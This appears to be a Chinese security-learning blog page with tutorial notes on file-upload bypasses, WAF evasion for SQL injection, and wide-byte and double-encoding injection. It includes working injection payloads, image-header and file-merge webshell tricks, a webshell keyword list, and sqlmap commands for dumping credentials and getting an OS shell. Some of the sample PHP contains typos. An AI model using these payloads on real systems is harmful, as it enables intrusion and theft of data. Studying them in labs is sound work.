<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
<meta name="description" content="散人的漫漫学习路">
<meta property="og:type" content="website">
<meta property="og:title" content="Hack the world">
<meta property="og:url" content="http://example.com/page/7/index.html">
<meta property="og:site_name" content="Hack the world">
<meta property="og:description" content="散人的漫漫学习路">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="D0gekong">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/page/7/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/7/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack the world</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Hack the world</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">Fake it till Make it</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="D0gekong"
      src="/images/pic.jpg">
  <p class="site-author-name" itemprop="name">D0gekong</p>
  <div class="site-description" itemprop="description">散人的漫漫学习路</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">89</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/SantaJiang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;SantaJiang" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/jiangshengda@foxmail.com" title="E-Mail → jiangshengda@foxmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.jianshu.com/u/3aa0cb901bee" title="简书 → https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;3aa0cb901bee" rel="noopener" target="_blank"><i class="fab fa-jianshu fa-fw"></i>简书</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/jsd581?spm=1010.2135.3001.5421" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;jsd581?spm&#x3D;1010.2135.3001.5421" rel="noopener" target="_blank"><i class="fab fa-csdn fa-fw"></i>CSDN</a>
      </span>
  </div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/pic.jpg">
      <meta itemprop="name" content="D0gekong">
      <meta itemprop="description" content="散人的漫漫学习路">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hack the world">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">文件上传</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-03-21 19:15:49 / 修改时间：21:24:23" itemprop="dateCreated datePublished" datetime="2022-03-21T19:15:49+08:00">2022-03-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>文件上传，一个网站的常见功能，多用于上传照片，视频，文档等许多类型文件</p>
<p>一般的流程：</p>
<ol>
<li>前端选择文件，进行提交</li>
<li>浏览器形成post multipart报文发送到服务器</li>
<li>服务器中间件接收到报文，解析后交给相关后端代码进行处理</li>
<li>后端代码将上传的文件内容写入到临时文件中（php特有）</li>
<li>写入到文件后，文件名为提交的文件名或以一定规则生成文件名<h2 id="请求报文解析："><a href="#请求报文解析：" class="headerlink" title="请求报文解析："></a>请求报文解析：</h2></li>
</ol>
<p>请求头：</p>
<p>第一行：请求方法和请求路径 以及Http协议版本</p>
<p>第二行：请求数据长度</p>
<p>请求Content-Type:请求方式的编码类型以及编码分割</p>
<p>请求数据：</p>
<p>普通参数:参数名和参数值</p>
<p>文件参数:文件名.上传文件的MIME/TYPE</p>
<p>代码实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$uploaddir=&#x27;upload/&#x27;;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">if(file_exist($uploaddir))</span><br><span class="line">&#123;</span><br><span class="line">if(move_uploaded_file($_FILES[&#x27;upfile&#x27;][&#x27;tmp_name&#x27;],$uploaddir.&#x27;/&#x27;.$_FILE[&#x27;upfile&#x27;][&#x27;name&#x27;])&#123;</span><br><span class="line">echo&#x27;xxxxxx&#x27;.$uploaddir.$_FILE[&#x27;upfile&#x27;][&#x27;name&#x27;].&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">exit($uploaddir.&#x27;xxxxx&#x27;)&#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>当文件上传点未对上传的文件进行严格的验证和过滤时，就容易造成任意文件上传，包括上传动态文件(asp/php/jsp等等）<br>如果上传的目标目录没有限制执行权限，导致所上传的动态文件如webshell可以正常执行并且可以访问，及造成了文件上传漏洞</p>
<p>上传漏洞的必要条件：</p>
<ul>
<li>存在上传点</li>
<li>可以传动态文件</li>
<li>上传目录有执行权限，且上传的文件可执行</li>
<li>可访问到上传的动态文件</li>
</ul>
<h3 id="文件上传检测流程："><a href="#文件上传检测流程：" class="headerlink" title="文件上传检测流程："></a>文件上传检测流程：</h3><p>前端提交-&gt;数据传输-&gt;后端处理-&gt;写入文件系统-&gt;访问文件</p>
<p>前端：JS检测，Flash AS检测</p>
<p>数据：WAF拦截，IPS拦截</p>
<p>后端：扩展名检测，文件格式检测，MIMETYPE检测，内容检测</p>
<p>写入：文件重命名，杀软查杀</p>
<p>访问：无权限，未知位置</p>
<h3 id="客户端检测绕过："><a href="#客户端检测绕过：" class="headerlink" title="客户端检测绕过："></a>客户端检测绕过：</h3><ul>
<li><p>JavaScript检测：通过浏览器提交上传请求前，触发检测用JS脚本进行检测<br>例如：普通的表单上传</p>
</li>
<li><p>Flash AS脚本检测：上传用Flash中，提交上传请求前，触发检测用AS脚本进行检测<br>例如：DZ的头像上传</p>
</li>
<li><p>APP上传检测：<br>检测写在APP客户端代码中，或调用的HTML页面中</p>
</li>
</ul>
<p>客户端检测一般只检测文件扩展名，客户端进行的检测，可通过对客户端代码的一些修改或直接拦截改报文即可绕过，所以这种上传限制基本等于没有</p>
<h3 id="前端JavaScript检测绕过："><a href="#前端JavaScript检测绕过：" class="headerlink" title="前端JavaScript检测绕过："></a>前端JavaScript检测绕过：</h3><ul>
<li>查看onchange.onsubmit等事件<br>onchange事件会在域的内容改变时发生</li>
</ul>
<p>onsubmit事件会在表单中的确认按钮被点击时发生</p>
<ul>
<li>删除掉相关事件中的检测函数<h3 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h3></li>
</ul>
<p>可以设置一个文件上传环境，环境只允许上传图片例如jpg.png等，上传一个内容为phpinfo()的phpinfo.php，提示我们只能上传图片类型文件，当前文件类型为php，这种时候可以通过F12或者右键审查元素查看相关表单里的事件属性</p>
<p>，可发现这种情况属性的值一般是对文件后缀名进行判断的JS脚本checkfile()。</p>
<p>修改方案很容易，就是把事件属性删除然后继续上传，即可上传成功弹出phpinfo的页面</p>
<h4 id="提交报文修改检测（前端检测通用）"><a href="#提交报文修改检测（前端检测通用）" class="headerlink" title="提交报文修改检测（前端检测通用）"></a>提交报文修改检测（前端检测通用）</h4><ol>
<li>首先选择正常文件进行上传</li>
<li>而后通过BP进行截包改包或改包重放完成文件上传<br>这种方法前端绕过检测中通用，无需理会具体前端的检测代码，直接绕过前端进行上传报文的修改并提交</li>
</ol>
<h3 id="练习：-1"><a href="#练习：-1" class="headerlink" title="练习："></a>练习：</h3><p>环境只允许上传图片类型文件，我们上传一个后缀名为jpg的phpinfo文件后截包，可以看到数据包里后缀名为jpg，修改为php然后放包，可以看到文件已上传成功，然后访问文件就能进去phpinfo页面</p>
<h3 id="服务器检测绕过"><a href="#服务器检测绕过" class="headerlink" title="服务器检测绕过"></a>服务器检测绕过</h3><p>检测内容：文件名（一般为后缀名).文件内容.MIME/TYPE</p>
<h4 id="MIME类型检测绕过："><a href="#MIME类型检测绕过：" class="headerlink" title="MIME类型检测绕过："></a>MIME类型检测绕过：</h4><p>MIME是描述消息内容类型的因特网标准。MIME消息能包含文本.图像.音频及视频以及其他应用程序专用数据，浏览器会自动根据所上传的文件的拓展名对应到相应的MIME类型上</p>
<p>代码实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uploaded_type = $_FILES[&#x27;upfile&#x27;][&#x27;type&#x27;];</span><br><span class="line">if(($uplpaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot;|| $uploaded_type == &quot;image/gif&quot;))&#123;</span><br></pre></td></tr></table></figure>
<p>常见的白名单MIME TYPE:<br>|扩展名|MIME TYPE|<br>|:—-|:—-|<br>|jpg|image/jpeg|<br>|png|image/png|<br>|txt|text/plain|<br>|zip|application/zip|</p>
<p>因为contenttype是由浏览器自动生成的，属于是报文的一个内容并发送给服务器，所以我们可以随意修改并不影响上传文件的内容</p>
<h4 id="练习：-2"><a href="#练习：-2" class="headerlink" title="练习："></a>练习：</h4><p>在MIME限制了文件类型的环境中上传其他类型文件，上传phpinfo.php并截包</p>
<p>可以发现并不是contenttype并不是我们所期望的类型，把contenttype的类型改为所期望的类型重发包，访问文件即可弹出phpinfo</p>
<h3 id="文件内容检测绕过"><a href="#文件内容检测绕过" class="headerlink" title="文件内容检测绕过"></a>文件内容检测绕过</h3><ol>
<li>简单文件头检测<br>文件头是位于文件开头的一段承担一定任务的数据，一般都在开头的部分</li>
</ol>
<p>文件头的起始部分中一般开头标记文件类型，如gif的文件头为GIF89a或GIF87a</p>
<p>代码实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function isImage($file)&#123;</span><br><span class="line">$fh = fopen($file,&#x27;rb&#x27;);</span><br><span class="line">if($fh)&#123;</span><br><span class="line">$byte = fread($fh,6);</span><br><span class="line">$fclos($fh);</span><br><span class="line">if($byte === false)&#123;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">if(substr($byte,0,3) == &quot;\xff\xd8\xff&quot;)&#123;</span><br><span class="line">return &#x27;image/jpeg&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">if($byte == &quot;\x89PNG\x0d\x0a&quot;)&#123;</span><br><span class="line">return &quot;image/png&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if($byte == &quot;GIF87a&quot; or $byte == &quot;GIF89a&quot;)&#123;</span><br><span class="line">return &#x27;image/gif&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码是通过文件头的起始部分进行匹配，比较简单的一种文件类型检测方法，这种简单的只对文件头进行简单的匹配的方法，可以通过在上传的文件前追加合法的文件头进行绕过如:GIF89a<?php phpinfo();?></p>
<h3 id="练习：-3"><a href="#练习：-3" class="headerlink" title="练习："></a>练习：</h3><p>老样子在环境里上传一个phpinfo.php拦截包并上传，将contenttype改为image/png,还是没通过说明文件类型被识别出来了，我们在文件内容中加入GIF89a再上传，可以看到上传成功并访问成功过phpinfo，前面的GIF89a被当做文本内容识别</p>
<p>这里再用Jpg做尝试，先记住jpg的文件头为\xff\xd8\xff，在文件内容这一处用url编码的形式写好%ff%d8%ff然后解码再上传可以看到上传成功并成功访问phpinfo</p>
<p>2.完整文件结构检测</p>
<p>通过调用图像函数(如getimagesize/imagecreatefromgif/imagecreatefrompng)进行检测文件是否为图像，需要文件内容保持相对完整，所以无法通过上种追加头部起始字节的方法进行绕过</p>
<p>代码实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(@imagecreatefromgif($uploaded_tmp))&#123;</span><br><span class="line">if(move_uploaded_file($_FILES[&#x27;upfile&#x27;][&#x27;tmp_name&#x27;],$uploaddir.&#x27;/&#x27;.$_FILES[&#x27;upfile&#x27;][&#x27;name&#x27;]))&#123;</span><br><span class="line">echo &#x27;xxxxxxxxx&#x27;.$uploadeddir.$_FILES[&#x27;upfile&#x27;][&#x27;name&#x27;].&quot;\n&quot;;</span><br></pre></td></tr></table></figure>
<p>针对这种检测，可以将图片文件与欲上传的文件进行合并来绕过检测，可通过copy命令来进行文件合并<br>合并后的文件只要未经过清洗或者缩放等操作即可通过检测，并保持欲上传文件的完整，由于上传文件的图片部分在解析为PHP时会以乱码显示，建议和尽量小的图片文件进行合并，否则会有大量乱码</p>
<p>copy命令:copy /b 1.jpg + phpinfo.php 1.php</p>
<p>3.恶意文件内容检测</p>
<p>检测提交内容是否包含webshell等数据</p>
<p> 推荐使用weevely进行尝试,kail中自带或者开源的webshell收集项目</p>
<p><a target="_blank" rel="noopener" href="https://www.github.com/sunge/Weevely">www.github.com/sunge/Weevely</a> 或者<a target="_blank" rel="noopener" href="https://www.github.com/tennc/webshell">www.github.com/tennc/webshell</a></p>
<p>常见关键字：</p>
<p>eval(.</p>
<p>base64_encode(</p>
<p>assert(</p>
<p>java.lang.Runtime</p>
<p>java.lang.ProcessBuilder等</p>
<h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><ol>
<li>文件上传过程中，如果存在waf拦截一些拓展名，可以通过尝试多个filename属性<br>例如文件限制为图片类型，在数据包中传filename=phpinfo.gif filename=phpinfo.php即可绕过</li>
</ol>
<p>2.目录可控时，可以尝试使用目录穿越的方法(../)</p>
<p> 2.1扩展名检测类型可控</p>
<ol>
<li>可以从后台修改允许/禁止的扩展名类型</li>
<li>提交参数中存在/禁止的扩展名类型</li>
<li>前端单独抽出了文件扩展名进行了提交</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/20/SQL/WAF%E7%BB%95%E8%BF%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/pic.jpg">
      <meta itemprop="name" content="D0gekong">
      <meta itemprop="description" content="散人的漫漫学习路">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hack the world">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/20/SQL/WAF%E7%BB%95%E8%BF%87/" class="post-title-link" itemprop="url">WAF绕过</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-03-20 19:31:17 / 修改时间：19:31:58" itemprop="dateCreated datePublished" datetime="2022-03-20T19:31:17+08:00">2022-03-20</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>掌握mysql函数和语法使用方法+深入了解中间件运行处理机制+了解WAF防护原理及方法=绕过WAF防护</p>
<p>代码实现：</p>
<p>（部分）</p>
<p>$id =$_GET[‘id’];</p>
<p>$id = blacklist($id);</p>
<p>$sql=’select * from users where id=’$id’ limit 0,1”;</p>
<p>$result = mysql_query($sql);</p>
<p>$row = mysql_fetch_array($result);</p>
<p>function blacklist($id)</p>
<p>{</p>
<p>$id = preg_replace(‘/or/i’,’’,$id);</p>
<p>$id = preg_replace(‘/AND/i’,’’,$id);</p>
<p>return $id;</p>
<p>}</p>
<p>1.分析代码：</p>
<p>使用了Blacklist函数过滤了’or’和’and’</p>
<p>2.绕过限制</p>
<p> 大小写变形：Or OR,oR 等价替换：and = &amp; or = || 双写等</p>
<p>黑盒绕过：</p>
<ol>
<li>架构层绕过：</li>
</ol>
<ul>
<li>寻找源站，针对云WAF</li>
<li>利用同网段，绕过WAF防护区域</li>
<li>利用边界漏洞，绕过WAF防护区</li>
</ul>
<p> 2.资源限制角度绕过WAF</p>
<ul>
<li><pre><code> post大body
</code></pre>
</li>
</ul>
<p> 3.协议层面绕WAF</p>
<ul>
<li>协议未覆盖WAF<br>（请求方式变化：get&gt;post 参数污染）</li>
</ul>
<p> 4.规则层面绕过</p>
<ol>
<li>sql注释符绕过</li>
</ol>
<ul>
<li>union /**/select</li>
<li>union/<em>aaa%01bbs</em>/select</li>
<li>union/<em>aaaaaaaaaaaaaaaaaaaaaa</em>/select</li>
<li>内联注释:/<em>!xxx</em>/</li>
</ul>
<p> 2.空白符绕过</p>
<ul>
<li>mysql空白符:%09.%0A.%0B.%0D.%0C.%A0.%20,/<em>xxx</em>/</li>
<li>正则的空白符：%09.%0A.%0B.%0D.%20<br>exa1:union%250Cselect</li>
</ul>
<p>exa2:union%25A0select</p>
<p> 3.函数分割符号：</p>
<ul>
<li> concat%2520(</li>
<li>concat/**/(</li>
<li>concat%250c(</li>
<li>concat%25a0(</li>
</ul>
<p> 4.浮点数词法解析</p>
<ul>
<li><p>select * from users where id = 8E0union select 1,2,3,4,5,6,7,8,0</p>
</li>
<li><p>select * from users where id = 8.0 union select 1,2,3,4,5,6,7,8,0</p>
</li>
<li><p>select * from users where id =\N union select 1,2,3,4,5,6,7,8,9,0<br>5.利用error-base进行sql注入：error-based sql注入函数非常容易被忽略</p>
</li>
<li><p>extractvalue(1,concat(0x5c,md5(3)));</p>
</li>
<li><p>updatexml(1,concat(0x5d,md5(3)),1);</p>
</li>
<li><p>GeometryCollection((select * from(select * from(select@@version)f)x))</p>
</li>
<li><p>polygon((select * from (select name_const(version(),1))x))</p>
</li>
<li><p>linestring()</p>
</li>
<li><p>multipoint()</p>
</li>
<li><p>multilinestring()</p>
</li>
<li><p>multipolygon()</p>
</li>
</ul>
<p> 6.mysql特殊语法</p>
<ul>
<li> select{x table_name}from{x information_schema.tables};<br>以注释符绕过为例，采取工具BP进行fuzz注释符内的字符获取payload</li>
</ul>
<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="sqlmap常见命令"><a href="#sqlmap常见命令" class="headerlink" title="sqlmap常见命令"></a>sqlmap常见命令</h2><p>sqlmap.py -u ‘url?id=1’</p>
<p>sqlmap.py -u ‘url?id=1’ – current-db</p>
<p>sqlmap.py -u ‘url?id=1’ –current-user</p>
<p>sqlmap.py -u ‘url?id=1’ -D security –tables</p>
<p>sqlmap.py -u ‘url?id=1’ -D security -T users –columns</p>
<p>sqlmap.py -u ‘url?id=1’ -D security -T users -C username,password –dump</p>
<p>sqlmap.py -u ‘url?id=1’ –os-shell</p>
<p>sqlmap.py -u ‘url?id=1’ –sql-shell</p>
<p>sqlmap.py -u ‘url?id=1’ –file-read</p>
<p>sqlmap.py -u ‘url?id=1’ –file-write 本地文件 –file-dest 目标目录及文件</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/20/SQL/%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/pic.jpg">
      <meta itemprop="name" content="D0gekong">
      <meta itemprop="description" content="散人的漫漫学习路">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hack the world">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/20/SQL/%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">其他注入</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-03-20 16:50:54 / 修改时间：16:53:58" itemprop="dateCreated datePublished" datetime="2022-03-20T16:50:54+08:00">2022-03-20</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>GB2312,GBK等这些都是宽字节，实际为两字节</p>
<p>常规输入’后会被处理为&#39;，然后进行编码为%5c%27即&#39;，代入sql为id=1&#39; and这明显是不能注入的</p>
<p>当mysql在使用gbk编码，会认为两个字符为一个汉字</p>
<p>%df’会被处理为%df&#39;，进行编码%df%5c%27,其中%df%5c组合会被认为是一个汉字（前一个ASCII码大于128才能到汉字的范围），id=某汉字’ and可以注入</p>
<p>方法：</p>
<p>在注入点后键入%df，然后按照正常流程开始注入</p>
<p>less-32</p>
<p>黑盒测试：在可能注入点后键入%df进行测试</p>
<p>白盒测试:</p>
<ol>
<li>查看mysql编码是否为gbk</li>
<li>是否使用preg_replace转义单引号</li>
<li>是否使用addslasher转义</li>
<li>是否使用mysql_real_escape_string转义<h3 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h3></li>
</ol>
<p>id=1’</p>
<p>回显变为了1&#39;</p>
<p>id=1%df%27</p>
<p>回显多了个不可见字符组合成了一个汉字并报错，很明显我们可以开始注入，按照以前的流程</p>
<p>id=%df%27 union select 1,(select user()),3–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;%df&#x27; union select 1,(select user()),3--+&#x27;</span><br></pre></td></tr></table></figure>
<p>回显当前用户，剩下的直接按照之前的套路即可<br>也可使用sqlmap</p>
<p>但是如果不进行处理直接键入</p>
<p>比如sqlmap -u ‘url’ 是不会显示有注入点的需要在url加一个汉字参数</p>
<p>比如sqlmap -u ‘url?id=1%df’类似 这样即可</p>
<p><strong>重点还是是否设置了编码gbk这些宽字节的编码！！！！！以及那些能进行转义的函数</strong></p>
<h3 id="防御："><a href="#防御：" class="headerlink" title="防御："></a><strong>防御：</strong></h3><ol>
<li>设置utf-8，避免宽字节注入ps：不仅在gbk，日文和韩文都存在宽字节漏洞</li>
<li>使用mysql_real_escape_string时一定要设置mysql_set_charset(‘gbk’,$conn);</li>
<li>可以设置参数character_set_client=binary<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h2></li>
</ol>
<h3 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h3><p>面对php代码或者配置时,urldecode()与本身处理编码时，两者配合失误，可以构造错误消灭\</p>
<p>用户输入id=1%27，php自身编码id=1’，转义为1&#39;，代入sql为id=1&#39;不能注入</p>
<p>php代码中放置了urldecode()等编码函数，放置在一个尴尬的位置，与php自身编码配合失误</p>
<p>用户输入id=1%2527，自身编码为id=1%27,此时没有’没有触发转义，函数编码为id=1’，代入sql为id=1’ and可以注入</p>
<p>代码实现：</p>
